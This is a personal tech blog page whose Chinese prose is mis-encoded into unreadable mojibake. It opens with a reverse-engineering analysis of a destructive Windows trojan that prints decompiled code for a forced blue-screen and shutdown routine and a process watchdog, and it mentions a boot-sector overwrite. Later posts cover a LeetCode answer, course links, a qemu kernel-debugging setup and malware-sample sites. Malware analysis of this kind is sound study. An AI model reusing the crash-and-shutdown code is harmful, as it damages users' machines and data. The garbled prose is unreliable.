<p>exeinfopeæ‰«æï¼Œ32ä½ï¼Œæ— å£³</p>
<p>getSystemMetics <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/GetSystemMetrics/5608817">https://baike.baidu.com/item/GetSystemMetrics/5608817</a> è·å–å±å¹•åˆ†è¾¨ç‡ï¼Œåˆ†åˆ«æ˜¯x,y</p>
<p>ç—…æ¯’ç¬¬ä¸€æ¬¡è¿è¡Œï¼Œä¼šåˆ›å»º10ä¸ªè‡ªå·±ï¼Œå‚æ•°æ˜¯/watchdogï¼Œç„¶åä»¥mainå‚æ•°è¿è¡Œï¼Œå¹¶é€€å‡ºç¨‹åº</p>
<p>/watchdogå‚æ•°ä¸‹ä¼šæœ€ç»ˆæ‹’ç»å…³æœºï¼Œä¸æ–­åœ°è¡ç”Ÿå‡ºæ›´å¤šè¿›ç¨‹ï¼Œæ¯æ¬¡ä¼šç­‰å¾…10ç§’ã€‚å¦‚æœè¿›ç¨‹å‡å°‘äº†ï¼Œè·å–å…³æœºæƒé™</p>
<p>è·å–å…³æœºæƒé™å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">BOOL __usercall sub_401021@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  HMODULE v3; <span class="comment">// edi</span></span><br><span class="line">  FARPROC RtlAdjustPrivilege; <span class="comment">// ebx</span></span><br><span class="line">  FARPROC NtRaiseHardError; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> (__cdecl *v6)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); <span class="comment">// esi</span></span><br><span class="line">  HANDLE v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp-20h] [ebp-28h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_PRIVILEGES</span> <span class="title">v10</span>;</span> <span class="comment">// [esp-18h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp-8h] [ebp-10h] BYREF</span></span><br><span class="line">  HANDLE v12; <span class="comment">// [esp-4h] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+0h] [ebp-8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    CreateThread(<span class="number">0</span>, <span class="number">0x1000</span>u, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    Sleep(<span class="number">0x64</span>u);</span><br><span class="line">    --v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 );</span><br><span class="line">  v2 = v14;</span><br><span class="line">  v14 = a1;</span><br><span class="line">  v9 = v2;</span><br><span class="line">  v3 = LoadLibraryA(<span class="string">&quot;ntdll&quot;</span>);</span><br><span class="line">  RtlAdjustPrivilege = GetProcAddress(v3, <span class="string">&quot;RtlAdjustPrivilege&quot;</span>);</span><br><span class="line">  NtRaiseHardError = GetProcAddress(v3, <span class="string">&quot;NtRaiseHardError&quot;</span>);</span><br><span class="line">  v6 = (<span class="keyword">void</span> (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))NtRaiseHardError;</span><br><span class="line">  <span class="keyword">if</span> ( RtlAdjustPrivilege &amp;&amp; NtRaiseHardError )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="keyword">void</span> (__cdecl *)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD, <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>))RtlAdjustPrivilege)(<span class="number">19</span>, <span class="number">1</span>, <span class="number">0</span>, (<span class="keyword">char</span> *)&amp;v13 + <span class="number">3</span>, v13, v9);</span><br><span class="line">    v6(<span class="number">-1073741790</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, &amp;v11);</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = GetCurrentProcess();</span><br><span class="line">  OpenProcessToken(v7, <span class="number">0x28</span>u, &amp;v12);</span><br><span class="line">  LookupPrivilegeValueW(<span class="number">0</span>, <span class="string">L&quot;SeShutdownPrivilege&quot;</span>, (PLUID)v10.Privileges);</span><br><span class="line">  v10.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">  v10.Privileges[<span class="number">0</span>].Attributes = <span class="number">2</span>;</span><br><span class="line">  AdjustTokenPrivileges(v12, <span class="number">0</span>, &amp;v10, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ExitWindowsEx(<span class="number">6u</span>, <span class="number">0x10007</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›‘æµ‹æ•°é‡éƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = CreateToolhelp32Snapshot(<span class="number">2u</span>, <span class="number">0</span>);</span><br><span class="line">    pe.dwSize = <span class="number">556</span>;</span><br><span class="line">    Process32FirstW(v2, &amp;pe);</span><br><span class="line">    v3 = lpString1;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      hObject = OpenProcess(<span class="number">0x400</span>u, <span class="number">0</span>, pe.th32ProcessID);</span><br><span class="line">      lpString2 = (LPCSTR)LocalAlloc(<span class="number">0x40</span>u, <span class="number">0x200</span>u);</span><br><span class="line">      GetProcessImageFileNameA(hObject, lpString2, <span class="number">512</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !lstrcmpA(v3, lpString2) )</span><br><span class="line">        ++v4;</span><br><span class="line">      CloseHandle(hObject);</span><br><span class="line">      LocalFree((HLOCAL)lpString2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( Process32NextW(v2, &amp;pe) );</span><br><span class="line">    CloseHandle(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; v7 )</span><br><span class="line">      sub_401021();</span><br><span class="line">    v7 = v4;</span><br><span class="line">    Sleep(<span class="number">0xA</span>u);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>å‘PhysicalDrive0å†™å…¥å‡ ä¸ªå¥‡æ€ªçš„å­—èŠ‚ï¼Œ0x7A0å¤§å°ã€‚çœ‹å¤§ä½¬åˆ†ææ˜¯æ”¹å˜äº†æ‰‡åŒºå¯åŠ¨é¡¹ã€‚</p>
<p>ç„¶ååˆ›å»ºçº¿ç¨‹ï¼Œå‡½æ•°åˆ—è¡¨ä½äº405130ï¼Œå…±10ä¸ªå‡½æ•°</p>
<ol>
<li>æ‰“å¼€éšæœºç½‘å€<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4014FC</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line"><span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">v1 = sub_401A55();</span><br><span class="line">ShellExecuteA(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, (&amp;lpFile)[v1 % <span class="number">0x2E</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">v2 = sub_401A55();</span><br><span class="line"><span class="keyword">return</span> sub_401B09(</span><br><span class="line">        COERCE_UNSIGNED_INT64((<span class="keyword">double</span>)a1),</span><br><span class="line">        HIDWORD(COERCE_UNSIGNED_INT64((<span class="keyword">double</span>)a1)),</span><br><span class="line">        (<span class="keyword">double</span>)(v2 % <span class="number">200</span>) + <span class="number">1500.0</span> / ((<span class="keyword">double</span>)a1 / <span class="number">15.0</span> + <span class="number">1.0</span>) + <span class="number">100.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>éšæœºè®¾ç½®é¼ æ ‡ä½ç½®<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_40156D</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line"><span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line"><span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line"><span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line"><span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line"><span class="keyword">int</span> v11; <span class="comment">// [esp-4h] [ebp-18h]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagPOINT</span> <span class="title">Point</span>;</span> <span class="comment">// [esp+Ch] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">GetCursorPos(&amp;Point);</span><br><span class="line">v2 = a2 / <span class="number">2200</span> + <span class="number">2</span>;</span><br><span class="line">v3 = sub_401A55(<span class="number">2200</span>) % v2;</span><br><span class="line">v5 = sub_401A55(v4) % v2;</span><br><span class="line">v7 = sub_401A55(v6);</span><br><span class="line">v11 = Point.y + v3 * (v7 % <span class="number">3</span> - <span class="number">1</span>);</span><br><span class="line">v9 = sub_401A55(v8);</span><br><span class="line">SetCursorPos(Point.x + v5 * (v9 % <span class="number">3</span> - <span class="number">1</span>), v11);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>é€šè¿‡sendInputå‘é€éšæœºASCIIç æ¶ˆæ¯</li>
<li>æ’­æ”¾SystemHandå£°éŸ³</li>
<li>éšä¾¿ç”»ä¸€äº›ä¸œè¥¿</li>
<li>å¼¹å‡ºStill using this computer? lol</li>
<li>éšæœºç”»å›¾æ ‡</li>
<li>ç©·ä¸¾æ¡Œé¢ä¸Šçš„çª—å£ï¼Œå¹¶å‘é€è¶…æ—¶æ¶ˆæ¯ã€‚è¿™æ ·ä¼šå¯¼è‡´ç³»ç»Ÿå´©æºƒ</li>
<li>å¤åˆ¶ä¸€ä¸ªçŸ©å½¢</li>
<li>è¿˜æ˜¯éšæœºç”»çŸ©å½¢</li>
</ol>
<h2 id="leetcodeæ¯æ—¥ä¸€é¢˜-27-ç§»é™¤å…ƒç´ "><a href="#leetcodeæ¯æ—¥ä¸€é¢˜-27-ç§»é™¤å…ƒç´ " class="headerlink" title="leetcodeæ¯æ—¥ä¸€é¢˜ 27. ç§»é™¤å…ƒç´ "></a>leetcodeæ¯æ—¥ä¸€é¢˜ 27. ç§»é™¤å…ƒç´ </h2><p>æ€è·¯ï¼šå…ˆä»åå‘å‰æ‰«æç›¸ç­‰çš„ï¼Œç›´åˆ°æ•°ç»„ç©ºæˆ–é‡åˆ°ä¸ç›¸ç­‰çš„ä¸ºæ­¢ã€‚ç„¶åä»å‰å‘åæ‰«æï¼Œç›´åˆ°é‡åˆ°lastä¸ºæ­¢ã€‚å¦‚æœä»å‰å‘åé‡åˆ°è¦å»é™¤çš„æ•°ï¼Œåˆ™è®©lastæŒ‡å‘çš„æ•°æ›¿æ¢è¿™ä¸ªæ•°ï¼Œlastå‰ç§»ï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªä¸ç›¸ç­‰çš„æ•°ä¸ºæ­¢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!numsSize)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> last=numsSize<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(last&gt;<span class="number">-1</span>&amp;&amp;nums[last]==val)&#123;</span><br><span class="line">        last--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if(!last)return last;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;last;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i]==val)&#123;</span><br><span class="line">            nums[i]=nums[last];</span><br><span class="line">            last--;</span><br><span class="line">            <span class="keyword">while</span>(last&amp;&amp;nums[last]==val)&#123;</span><br><span class="line">                last--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> last+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-daily/IS/open-course-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/04/16/daily/IS/open-course-1/" class="article-date">
  	<time datetime="2021-04-16T14:56:53.000Z" itemprop="datePublished">2021-04-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/04/16/daily/IS/open-course-1/">
        ä¿¡æ¯å®‰å…¨å…¬å¼€è¯¾æ”¶é›†
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>MITè®¡ç®—æœºç³»ç»Ÿå®‰å…¨ <a target="_blank" rel="noopener" href="https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/">https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/</a></p>
<p>çªƒå¬å¤§æ•°æ® <a target="_blank" rel="noopener" href="https://learning.edx.org/course/course-v1:CornellX+ENGRI1280x+3T2017/home">https://learning.edx.org/course/course-v1:CornellX+ENGRI1280x+3T2017/home</a></p>
<p>é«˜çº§åŠ å¯†æŠ€æœ¯ <a target="_blank" rel="noopener" href="https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-876j-advanced-topics-in-cryptography-spring-2003/">https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-876j-advanced-topics-in-cryptography-spring-2003/</a></p>
<p>æ¸—é€æµ‹è¯•è¯¾ç¨‹é›†åˆ <a target="_blank" rel="noopener" href="https://www.classcentral.com/tag/penetration-testing">https://www.classcentral.com/tag/penetration-testing</a></p>
<p>ç¤¾ä¼šå·¥ç¨‹ <a target="_blank" rel="noopener" href="https://www.udemy.com/course/the-art-of-hacking-humans-intro-to-social-engineering/learn/lecture/9706122#overview">https://www.udemy.com/course/the-art-of-hacking-humans-intro-to-social-engineering/learn/lecture/9706122#overview</a> <a target="_blank" rel="noopener" href="https://www.coursera.org/learn/security-awareness-training/home/welcome">https://www.coursera.org/learn/security-awareness-training/home/welcome</a> (æ„Ÿè§‰è¿™é‡Œæ²¡æœ‰å¤§å­¦å…¬å¼€è¯¾æœ‰ç”¨)</p>
<p>æœºå™¨å­¦ä¹ ä¸­çš„æ•°å­¦ ç¬”è®° <a target="_blank" rel="noopener" href="https://ocw.mit.edu/courses/mathematics/18-657-mathematics-of-machine-learning-fall-2015/lecture-notes/">https://ocw.mit.edu/courses/mathematics/18-657-mathematics-of-machine-learning-fall-2015/lecture-notes/</a></p>
<p>æœºå™¨å­¦ä¹ ç¬”è®° <a target="_blank" rel="noopener" href="https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-867-machine-learning-fall-2006/lecture-notes/">https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-867-machine-learning-fall-2006/lecture-notes/</a></p>
<p>æ·±åº¦å­¦ä¹ ä»‹ç» <a target="_blank" rel="noopener" href="http://introtodeeplearning.com/2020/index.html">http://introtodeeplearning.com/2020/index.html</a></p>
<p>å¤§æ•°æ®å’Œæœºå™¨å­¦ä¹ ä¸­çš„æ•°å­¦ <a target="_blank" rel="noopener" href="https://ocw.mit.edu/resources/res-ll-005-mathematics-of-big-data-and-machine-learning-january-iap-2020/">https://ocw.mit.edu/resources/res-ll-005-mathematics-of-big-data-and-machine-learning-january-iap-2020/</a> </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/daily/IS/open-course-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/04/16/note/daily/IS/open-course-1/" class="article-date">
  	<time datetime="2021-04-16T14:56:15.000Z" itemprop="datePublished">2021-04-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/04/16/note/daily/IS/open-course-1/">
        ä¿¡æ¯å®‰å…¨å…¬å¼€è¯¾æ”¶é›†
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/win-driver/dri-5" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/04/16/note/win-driver/dri-5/" class="article-date">
  	<time datetime="2021-04-16T13:12:47.000Z" itemprop="datePublished">2021-04-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/04/16/note/win-driver/dri-5/">
        windowsé©±åŠ¨å¼€å‘-ç¬¬å››ç¬¬äº”ç« 
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/linux/driver-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/04/16/note/linux/driver-1/" class="article-date">
  	<time datetime="2021-04-16T12:57:48.000Z" itemprop="datePublished">2021-04-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/04/16/note/linux/driver-1/">
        linuxé©±åŠ¨å¼€å‘-1 ç¯å¢ƒæ­å»º
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>å®‰è£…qemu</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install qemu qemu-system qemu-user</span><br></pre></td></tr></table></figure>

<p>å®‰è£…äº¤å‰ç¼–è¯‘å·¥å…·é“¾</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-10-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>

<p>å»<a href="kernel.org">Linuxå†…æ ¸ç½‘ç«™</a>ä¸‹è½½5.10å†…æ ¸æºç </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ARCH=arm64</span><br><span class="line"><span class="built_in">export</span> CROSS_COPILE=aarch64-linux-gnu-</span><br><span class="line">make defconfig</span><br><span class="line"><span class="comment"># å¦‚æœéœ€è¦å¯ä»¥åœ¨æ­¤ é…ç½®initramfsè·¯å¾„ä¸º&quot;/tmp/rootfs/xxx&quot;</span></span><br><span class="line"><span class="comment"># è®°å¾—å‹¾é€‰ä¸Š&quot;Compile the kernel with debug info&quot;ï¼Œä»¥åŠå…¶ä»–è‡ªå·±è°ƒè¯•éœ€è¦çš„é…ç½®é€‰é¡¹</span></span><br><span class="line">make menuconfig</span><br><span class="line">make -j8 ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu-</span><br></pre></td></tr></table></figure>

<p>åˆ¶ä½œæ ¹æ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir rootfs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mengning/menu.git</span><br><span class="line"><span class="built_in">cd</span> menu</span><br><span class="line"><span class="comment"># ä¿®æ”¹Makefileï¼Œå»æ‰&quot;find init hello ***&quot;å’Œ&quot;qemu -kernel ../linux&quot;è¯­å¥</span></span><br><span class="line"><span class="built_in">cd</span> ../rootfs</span><br><span class="line">cp ../menu/init ./</span><br><span class="line">find . | cpio -o -Hnewc |gzip -9 &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>

<p>å®‰è£…è°ƒè¯•ç¯å¢ƒ</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨è°ƒè¯•ç¯å¢ƒ</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨ä¸€ä¸ªçª—å£è¾“å…¥å¯åŠ¨</span></span><br><span class="line">qemu-system-aarch64  -M  virt -cpu cortex-a53 -smp 2 -m 4096M  -kernel /tmp/arch/arm64/boot/Image.gz   -nographic  -append <span class="string">&quot;console=ttyAMA0 init=/linuxrc ignore_loglevel&quot;</span>   -initrd /tmp/rootfs/rootfs.img  -S -gdb tcp::9000</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è§£é‡Š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-smp æ ¸æ•°ç›®</span><br><span class="line">-m ç‰©ç†å†…å­˜å¤§å°</span><br><span class="line">-kernel å†…æ ¸å‹ç¼©é•œåƒä½ç½®</span><br><span class="line">-initrd rootfsä½ç½®</span><br><span class="line">-nographic ä¸ä½¿ç”¨å›¾å½¢ç•Œé¢ï¼Œä¸åŠ å¯èƒ½ä¼šå› ä¸ºæ— æ³•å¯åŠ¨å›¾å½¢ç•Œé¢è€Œå¤±è´¥</span><br><span class="line">-append cmdlineå¯åŠ¨å‚æ•°</span><br><span class="line">-S åœ¨å…¥å£å¤„é˜»å¡CPU</span><br><span class="line">-gdb tcp::xxxx æŒ‡å®šé€šä¿¡é€šé“ä¸º æœ¬åœ°tcpé€šé“(å› ä¸ºæ˜¯åœ¨åŒä¸€ä¸ªæœºå™¨ä¸Š)ï¼Œç«¯å£å·ä¸ºxxxxï¼Œå¦‚æœä¸éœ€è¦æŒ‡å®šç«¯å£å·å¯ä»¥ç”¨-s ä»£æ›¿</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p>QEMUæ­å»ºarm64 Linuxè°ƒè¯•ç¯å¢ƒ - å°ä¹å”å”çš„æ–‡ç«  - çŸ¥ä¹<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/345232459">https://zhuanlan.zhihu.com/p/345232459</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/virus-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/04/13/note/rev/virus-1/" class="article-date">
  	<time datetime="2021-04-13T15:17:25.000Z" itemprop="datePublished">2021-04-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/04/13/note/rev/virus-1/">
        å¸¸è§çš„ç—…æ¯’æ ·æœ¬ä¸‹è½½ç½‘ç«™
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ol>
<li><a target="_blank" rel="noopener" href="https://app.any.run/submissions">app.any.run </a></li>
<li><a target="_blank" rel="noopener" href="https://bazaar.abuse.ch/browse">https://bazaar.abuse.ch/browse</a></li>
<li><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum-32-1.html">52ç ´è§£ç—…æ¯’åˆ†æåŒº</a></li>
</ol>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/develop/driver-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/04/05/note/develop/driver-1/" class="article-date">
  	<time datetime="2021-04-05T01:32:39.000Z" itemprop="datePublished">2021-04-05</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/04/05/note/develop/driver-1/">
        é©±åŠ¨å¼€å‘å…¥é—¨-1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
